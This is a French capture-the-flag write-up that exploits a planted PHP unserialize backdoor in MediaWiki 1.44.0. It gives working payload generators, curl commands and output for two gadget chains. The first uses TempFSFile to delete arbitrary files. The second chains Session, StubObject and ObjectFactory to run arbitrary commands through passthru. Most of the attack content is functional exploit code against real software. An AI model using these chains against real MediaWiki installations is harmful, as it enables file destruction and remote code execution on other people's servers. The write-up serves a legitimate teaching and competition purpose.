# Les trampofolies

## Niveau 1
Ce défi est un défi de désérialisation PHP. La description nous procure le code d'une porte dérobée:

```php
33a34,37
> if(isset($_GET['backdoor'])) {
>         unserialize(base64_decode($_GET['backdoor']));
> }
> 
```

Si on installe une version de MediaWiki 1.44.0 localement (tel que spécifié dans le défi) et que nous appliquons le patch à `rest.php`, nous obtenons ceci:

```bash
$ patch rest.php < rest.php.diff
patching file rest.php
$ cat rest.php
use MediaWiki\Context\RequestContext;
use MediaWiki\EntryPointEnvironment;
use MediaWiki\MediaWikiServices;
use MediaWiki\Rest\EntryPoint;

define( 'MW_REST_API', true );
define( 'MW_ENTRY_POINT', 'rest' );

require __DIR__ . '/includes/WebStart.php';

if(isset($_GET['backdoor'])) {
        unserialize(base64_decode($_GET['backdoor']));
}

( new EntryPoint(
	EntryPoint::getMainRequest(),
	RequestContext::getMain(),
	new EntryPointEnvironment(),
	MediaWikiServices::getInstance()
) )->run();
```

Nous avons donc quelques imports/uses, deux définitions, un require et ensuite, ce que l'on passe dans le paramètre `backdoor` se fait désérialiser.

On peut essayer de passer quelque chose d'aléatoire pour voir le résultat:

```bash
$ curl http://localhost:8080/rest.php/?backdoor=test
<br />
<b>Notice</b>:  unserialize(): Error at offset 0 of 3 bytes in <b>/var/www/html/rest.php</b> on line <b>35</b><br />
{"errorKey":"rest-no-match","messageTranslations":{"fr":"Le chemin relatif requis (/) ne correspondait à aucun gestionnaire connu","en":"The requested relative path (/) did not match any known handler"},"httpCode":404,"httpReason":"Not Found"}
```

On voit en effet une erreur de désérialisation, c'est bien beau, mais ça nous avance pas beaucoup.

Dans un monde idéal, on pourrait maintenant utiliser [phpggc](https://github.com/ambionics/phpggc), trouver une chaine appropriée et l'exploiter pour compléter le défi. Cependant, aucune chaine fonctionnelle n'existe pour MediaWiki (du moins, pas pour cette version). Il faut donc en trouver une, mais pour ce faire, il faut comprendre le processus de désérialisation.

### Primer sur la désérialisation PHP
Un objet PHP peut définir plusieurs [méthodes "magiques"](https://www.php.net/manual/en/language.oop5.magic.php) qui sont appelées dans plusieurs cas. Les méthodes qui concernent la désérialisation sont les méthodes: `__unserialize` (appelée lors de la désérialisation, un peu comme un constructeur), `__serialize` (appelée lors de la sérialisation pour créer un objet sérialisé d'un format spécifique), `__destruct` (appelée lorsqu'un objet n'est plus référencé) et `__wakeup` (appelé après la création de l'objet).

D'autres méthodes peuvent aussi être utiles dans le contexte d'une chaine ou d'un contexte particulier. Par exemple: `__toString` (appelée lors de la concaténation ou de la conversion d'un objet en chaine de caractères), `__call` (appelée lors d'un appel de méthode sur l'objet), `__get` et `__set` (appelées lors d'un accès ou d'une assignation sur une propriété d'un objet). D'autres méthodes comme `offsetGet`, `offsetSet` et `offsetExists` peuvent aussi être utiles.

Ça fait beaucoup de méthodes! Heureusement, la plupart de celles-ci ne sont jamais implémentées. Dans la plupart des cas, nous cherchons une implémentation intéressante de la fonction `__destruct` puisqu'elle est toujours appelée.

### Solution
Cherchons donc toutes les classes utilisables que nous pourrions utiliser lors de la désérialisation. Pour qu'on puisse utiliser une classe, il faut qu'elle ait été définie auparavant où qu'elle soit *autoload*able (un sujet dans lequel je ne rentrerai pas, de toute façon on peut se débrouiller avec ce qui est déjà loadé).

Si on ajoute une ligne dans `rest.php` pour lister les classes utilisables, nous obtenons:

```php
print_r(get_declared_classes());
```

```
Array
(
	[... classes natives de PHP ...] 
    [196] => AutoLoader
    [197] => ComposerAutoloaderInit_mediawiki_vendor
    [198] => Composer\Autoload\ClassLoader
    [199] => Composer\Autoload\ComposerStaticInit_mediawiki_vendor
    [200] => MediaWiki\Config\SiteConfiguration
    [201] => siteconfiguration
    [202] => MediaWiki\Settings\SettingsBuilder
    [203] => MediaWiki\Registration\ExtensionRegistry
    [204] => extensionregistry
    [205] => MediaWiki\Settings\Config\GlobalConfigBuilder
    [206] => MediaWiki\Settings\Config\ConfigBuilderBase
    [207] => MediaWiki\Settings\Config\PhpIniSink
    [208] => MediaWiki\Settings\Config\ConfigSchemaAggregator
    [209] => MediaWiki\MainConfigNames
	[...]
    [352] => MediaWiki\Request\WebResponse
    [353] => MediaWiki\Session\Token
    [354] => MediaWiki\StubObject\StubGlobalUser
    [355] => MediaWiki\StubObject\StubObject
    [356] => MediaWiki\StubObject\StubUserLang
    [357] => MediaWiki\Output\OutputPage
    [358] => MediaWiki\Context\ContextSource
    [359] => contextsource
    [360] => outputpage
    [361] => MediaWiki\ResourceLoader\Module
    [362] => MediaWiki\Parser\ParserOutput
    [363] => MediaWiki\Parser\CacheTime
    [364] => cachetime
    [365] => parseroutput
    [366] => MediaWiki\Request\ContentSecurityPolicy
    [367] => MediaWiki\Request\ProxyLookup
    [368] => proxylookup
)
```

On peut ensuite filtrer cette liste pour ne garder que les classes qui ont une fonction `__destruct` implémentées:

```bash
$ grep -rEl 'class (AutoLoader|ComposerAutoloaderInit_mediawiki_vendor|ClassLoader|ComposerStaticInit_mediawiki_vendor|SiteConfiguration|siteconfiguration|SettingsBuilder|ExtensionRegistry|extensionregistry|GlobalConfigBuilder|ConfigBuilderBase|PhpIniSink|ConfigSchemaAggregator|MainConfigNames|PhpSettingsSource|HeaderCallback|WebRequest|webrequest|Telemetry|HttpStatus|httpstatus|ArraySource|AtEase|MergeStrategy|GlobalVarConfig|globalvarconfig|OutputHandler|outputhandler|DynamicDefaultValues|MainConfigSchema|NamespaceInfo|namespaceinfo|LanguageCode|languagecode|WikiMap|DatabaseDomain|ObjectCacheFactory|APCUBagOStuff|MediumSpecificBagOStuff|BagOStuff|bagostuff|mediumspecificbagostuff|apcubagostuff|StatsFactory|StatsCache|NullEmitter|NullLogger|AbstractLogger|Shell|SerializedValueContainer|MWDebug|mwdebug|MediaWikiServices|ServiceContainer|MWExceptionRenderer|mwexceptionrenderer|MWExceptionHandler|mwexceptionhandler|Profiler|ProfilerStub|TransactionProfiler|LoggerFactory|ObjectFactory|LegacySpi|LegacyLogger|LogLevel|HookRunner|ScopedCallback|StaticHookRegistry|DeprecatedHooks|HookContainer|MediaWikiPropagator|ConfigFactory|configfactory|NoopTracer|SpanContext|TracerState|RequestContext|requestcontext|NoopSpan|Assert|UrlUtils|TempFSFile|FSFile|fsfile|tempfsfile|IPUtils|PHPSessionHandler|SessionManager|ServiceOptions|OutputFormats|NullFormatter|BufferingStatsdDataFactory|StatsdDataFactory|bufferingstatsddatafactory|SqlBagOStuff|DeferredUpdates|deferredupdates|CachedBagOStuff|cachedbagostuff|HashBagOStuff|hashbagostuff|MessageFormatterFactory|Message|message|UserNameUtils|LanguageFactory|LocalisationCache|LCStoreDB|LanguageNameUtils|LanguageFallback|LanguageConverterFactory|MapCacheLRU|mapcachelru|TitleParser|titleparser|Title|LanguageEn|Language|language|ClassicInterwikiLookup|EmptyBagOStuff|emptybagostuff|WANObjectCache|wanobjectcache|MWLBFactory|ConfiguredReadOnlyMode|configuredreadonlymode|ChronologyProtector|RequestTimeout|BasicRequestTimeout|CriticalSectionProvider|LBFactorySimple|LBFactory|TextFormatter|RealTempUserConfig|Pattern|PhpSessionSerializer|CookieSessionProvider|SessionProvider|SessionInfo|GrantsInfo|BotPasswordSessionProvider|ImmutableSessionProviderWithCookie|MWCryptRand|SessionId|SessionBackend|UserFactory|LoadBalancer|ServerInfo|DatabaseFactory|LoadMonitor|User|user|Session|ConvertibleTimestamp|WebResponse|Token|StubGlobalUser|StubObject|StubUserLang|OutputPage|ContextSource|contextsource|outputpage|Module|ParserOutput|CacheTime|cachetime|parseroutput|ContentSecurityPolicy|ProxyLookup|proxylookup) ' | xargs grep -l '__destruct'
includes/StubObject/StubGlobalUser.php
includes/libs/filebackend/fsfile/TempFSFile.php
includes/profiler/SectionProfileCallback.php
includes/session/Session.php
includes/session/SessionBackend.php
```

Puisque le but de ce premier défi est de supprimer un fichier, `TempFSFile.php` semble potentiellement intéressant.

Voici la fonction `__destruct`:

```php
/**
* Cleans up after the temporary file by deleting it
*/
public function __destruct() {
	if ( $this->canDelete ) {
		$this->purge();
	}
}
```

Et l'implémentation de la fonction `purge`:

```php
/**
* Purge this file off the file system
*
* @return bool Success
*/
public function purge() {
	$this->canDelete = false; // done
	AtEase::suppressWarnings();
	$ok = unlink( $this->path );
	AtEase::restoreWarnings();

	unset( self::$pathsCollect[$this->path] );

	return $ok;
}
```

On voit que si le paramètre `canDelete` contient une valeur *vraie/truthy*, la fonction `purge` est appelée. Celle-ci appelle ensuite la fonction `unlink` sur le paramètre `path`.

Puisque l'on contrôle les valeurs de tous les paramètres lors de la désérialisation, nous pouvons utiliser l'appel à `unlink` pour supprimer le fichier de notre choix.

Voici le code qui génère notre payload:

```php
<?php
namespace Wikimedia\FileBackend\FSFile;

class FSFile {
	public $path;
}

class TempFSFile extends FSFile {
	public $canDelete;
}

$file = new TempFSFile();
$file->canDelete = true;
$file->path = "/var/www/html/images/thumb/f/fc/Trampolin.png/500px-Trampolin.png";

$payload = base64_encode(serialize($file));
echo $payload;
?>
```

Et la résolution du défi:

```bash
$ curl "http://localhost:8080/rest.php/?backdoor=$(php payload1.php)"
{"errorKey":"rest-no-match","messageTranslations":{"fr":"Le chemin relatif requis (/) ne correspondait à aucun gestionnaire connu","en":"The requested relative path (/) did not match any known handler"},"httpCode":404,"httpReason":"Not Found"}%

$ curl "http://localhost:8080/checkflag1.php"
Vive les trampolineux! flag-7aa47b8f0106691e
```

### Addendum 2025-08-20
Il existe un fork de phpggc qui contient déjà le payload pour effectuer une suppression de fichiers dans MediaWiki (en utilisant la même méthode).

Heureusement, les deux autres chaines ne fonctionnent pas sur l'instance du défi.

Voir MediaWiki/FD1 dans https://github.com/mcdruid/phpggc/tree/mediawiki

## Addendum 2025-08-25
Ce dernier addendum a très mal vieilli.

## Niveau 2
Pour cette partie, la solution est un peu plus complexe. On cherche à exécuter du code arbitraire sur le système pour pouvoir appeler une commande (la commande étant `/printflag2`).

Aucune des classes avec une implémentation `__destruct` ne semble utile parmi celles que l'on a trouvé. Cela dit, il existe plusieurs sinks intéressants dans MediaWiki, que ça soit avec des appels indirects ou des classes autoloadées.

> *Lors du QA*, un sink intéressant a été trouvé dans la classe CriticalSectionScope. Credits à @fishinspace.
> <br>Cette classe n'est pas affichée dans la liste de classes définies, mais elle est autoloadée au besoin.
> <br>Le payload précis est laissé en exercice:
> https://github.com/wikimedia/mediawiki-libs-RequestTimeout/blob/master/src/CriticalSectionScope.php

Bien que plusieurs solutions fonctionnelles existent, pour la solution "intentionnelle", les classes `Session`, `StubObject` et `ObjectFactory` ont été utilisées.

En effet, la classe `ObjectFactory` permet de créer des objets en appelant le constructeur d'une classe ou une fonction avec des arguments définis dans un array de paramètres.

La classe `StubObject` elle représente un objet qui est lazy-loadé, il contient une référence à une variable globale et lorsqu'une fonction est appelée ou qu'une propriété est utilisée sur l'objet, l'objet se fait loader s'il ne l'est pas déjà. Voir les implémentations de `__get`, `__set` et `__call`.

Finalement, la classe `Session` contient une implémentation de `__destruct` qui appelle une fonction sur sa propriété `backend`. Nous l'utiliserons comme catalyste pour déclencher le lazy-loading de `StubObject`.

La seule vraie contrainte dans cette chaine d'évènements est que `StubObject` ne fait du lazy-loading que s'il existe une variable globale `$GLOBALS[$this->global]` existe et qu'elle est du type `StubObject`. Heureusement, il en existe deux à ce point-ci, soit `wgUser` et `wgLang`.

Je vous encourage à suivre la chaine d'appels dans le code et d'essayer de la recréer avant de continuer votre lecture.

La génération de la chaine complète a l'air de ceci:

```php
<?php
namespace MediaWiki\Session {
	class Session {
		public $backend;
	}
}

namespace MediaWiki\StubObject {
	class StubObject {
		public $global;
		public $factory;
		public $params;
	}
}

namespace {
	$stub = new \MediaWiki\StubObject\StubObject();
	$stub->global = "wgUser";
	$stub->factory = "passthru";
	$stub->params = array("/printflag2");

	$session = new \MediaWiki\Session\Session();
	$session->backend = $stub;

	$payload = base64_encode(serialize($session));
	echo $payload;
}
?>
```

La résolution du défi cause des erreurs, mais ça nous importe peu:

```bash
$ curl "http://localhost:8080/rest.php/?backdoor=$(php payload2.php)"
flag-82853a62299d08bd<!DOCTYPE html>
<html><head><title>Erreur interne — Club des trampofolies</title><meta name="color-scheme" content="light dark" /><style>body { font-family: sans-serif; margin: 0; padding: 0.5em 2em; }</style></head><body>
<div dir=ltr><div class="cdx-message--error cdx-message cdx-message--block"><span class="cdx-message__icon"></span><div class="cdx-message__content"><p>[15dd17273c1b3f3131629fd8] /rest.php/?backdoor=TzoyNToiTWVkaWFXaWtpXFNlc3Npb25cU2Vzc2lvbiI6MTp7czo3OiJiYWNrZW5kIjtPOjMxOiJNZWRpYVdpa2lcU3R1Yk9iamVjdFxTdHViT2JqZWN0IjozOntzOjY6Imdsb2JhbCI7czo2OiJ3Z1VzZXIiO3M6NzoiZmFjdG9yeSI7czo4OiJwYXNzdGhydSI7czo2OiJwYXJhbXMiO2E6MTp7aTowO3M6MTE6Ii9wcmludGZsYWcyIjt9fX0=   UnexpectedValueException: &#039;factory&#039; did not return an object</p><p>Backtrace:</p><p>from /var/www/html/vendor/wikimedia/object-factory/src/ObjectFactory.php(229)<br />
#0 /var/www/html/includes/StubObject/StubObject.php(141): Wikimedia\ObjectFactory\ObjectFactory::getObjectFromSpec(array)<br />
#1 /var/www/html/includes/StubObject/StubObject.php(231): MediaWiki\StubObject\StubObject-&gt;_newObject()<br />
#2 /var/www/html/includes/StubObject/StubObject.php(124): MediaWiki\StubObject\StubObject-&gt;_unstub(string, int)<br />
#3 /var/www/html/includes/StubObject/StubObject.php(155): MediaWiki\StubObject\StubObject-&gt;_call(string, array)<br />
#4 /var/www/html/includes/session/Session.php(78): MediaWiki\StubObject\StubObject-&gt;__call(string, array)<br />
#5 /var/www/html/rest.php(35): MediaWiki\Session\Session-&gt;__destruct()<br />
#6 {main}</p>
</div></div></div></body></html>
```